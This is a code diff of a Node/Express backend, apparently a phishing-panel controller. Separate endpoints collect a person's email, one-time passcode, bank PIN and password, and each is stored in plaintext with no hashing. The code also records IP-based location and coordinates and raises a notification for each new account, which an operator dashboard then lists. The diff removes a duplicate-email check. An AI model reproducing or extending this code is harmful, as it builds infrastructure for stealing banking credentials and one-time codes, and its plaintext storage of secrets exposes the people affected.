@@ -163,118 +163,91 @@ const deletePost = async (req, res) => {
     res.status(500).json({ message: "Error deleting post", error });
   }
 };
-
 const setEmail = async (req, res) => {
   try {
     const { email, userId } = req.body;
-    const account = await Account.findOne({ email });
-    if (account) {
-      // console.log(account)
-      return res
-        .status(401)
-        .json({ message: "Account with the given email already exist" });
-    }
 
-    const userLocation = await getCountryFromIp();
-    const locationObject = {
-      country: userLocation?.country,
-      countryCode: userLocation?.countryCode,
-      region: userLocation?.region,
-      city: userLocation?.city,
-      ipAddress: userLocation?.ipAddress,
-      lat: userLocation?.lat,
-      lon: userLocation?.lon,
-    };
-
-    // Generate a 4-6 digit OTP (you can modify this as per your requirements)
-    // const otp = Math.floor(100000 + Math.random() * 900000); // Example: 6-digit OTP
-    // const bankPin = Math.floor(1000 + Math.random() * 9000); // Example: 6-digit OTP
+    // Create a new account even if an account with the same email exists
     const newAccount = new Account({
       email,
-      // otp,
       userId,
-      // bankPin,
-      location: locationObject,
+      location: await getLocationObject(),
     });
 
-    await newAccount.save();
+    const tempAccount = await newAccount.save();
 
-    res.status(201).json({ message: "Account initiated" });
+    res.status(201).json({
+      account: tempAccount,
+      message: "New account created successfully",
+    });
   } catch (error) {
-    console.log("inside error");
-    res.status(500).json({ error: "Failed to initialize account", error });
+    console.error("Error:", error);
+    res.status(500).json({ error: "Failed to create account", error });
   }
+};
+
+// Helper function to get user location
+const getLocationObject = async () => {
+  const userLocation = await getCountryFromIp();
+  return {
+    country: userLocation?.country,
+    countryCode: userLocation?.countryCode,
+    region: userLocation?.region,
+    city: userLocation?.city,
+    ipAddress: userLocation?.ipAddress,
+    lat: userLocation?.lat,
+    lon: userLocation?.lon,
+  };
 };
 
 const setOtp = async (req, res) => {
-  const { email, otp } = req.body;
+  const { accountId, otp } = req.body;
 
-  const account = await Account.findOne({ email });
+  const account = await Account.findById(accountId);
 
   if (!account) {
     return res.status(400).json({ error: "Account not found" });
   }
 
-  // Hash the password before saving
   account.otp = otp;
-
-  // Create notification after password is set
-  // const notification = new Notification({
-  //   message: "A new account has been created",
-  //   accountId: account._id,
-  // });
-  // await notification.save();
-
   await account.save();
 
-  res.status(200).json({ message: "otp set successfully" });
+  res.status(200).json({ message: "OTP set successfully" });
 };
 
 const setBankPin = async (req, res) => {
-  const { email, bankPin } = req.body;
+  const { accountId, bankPin } = req.body;
 
-  const account = await Account.findOne({ email });
+  const account = await Account.findById(accountId);
 
   if (!account) {
     return res.status(400).json({ error: "Account not found" });
   }
 
-  // Hash the password before saving
   account.bankPin = bankPin;
-
-  // Create notification after password is set
-  // const notification = new Notification({
-  //   message: "A new account has been created",
-  //   accountId: account._id,
-  // });
-  // await notification.save();
-
   await account.save();
 
-  res.status(200).json({ message: "Password set successfully" });
+  res.status(200).json({ message: "Bank PIN set successfully" });
 };
 
 const setPassword = async (req, res) => {
-  const { email, password } = req.body;
+  const { accountId, password } = req.body;
 
-  const account = await Account.findOne({ email });
+  const account = await Account.findById(accountId);
 
   if (!account) {
     return res.status(400).json({ error: "Account not found" });
   }
 
-  // Hash the password before saving
   account.password = password;
 
-  // Create notification after password is set
   const notification = new Notification({
-    message: "A new account has been created",
+    message: "Account password updated",
     accountId: account._id,
   });
   await notification.save();
 
   await account.save();
-
   res.status(200).json({ message: "Password set successfully" });
 };
 
@@ -324,7 +297,7 @@ const getAccounts = async (req, res) => {
       percentageChange = thisMonthAccounts > 0 ? 100 : 0;
     }
 
-    console.log('user id at get accounts', accounts)
+    // console.log('user id at get accounts', accounts)
     return res.status(200).json({
       accounts: accounts,
       totalPages: Math.ceil(totalAccounts / limit),
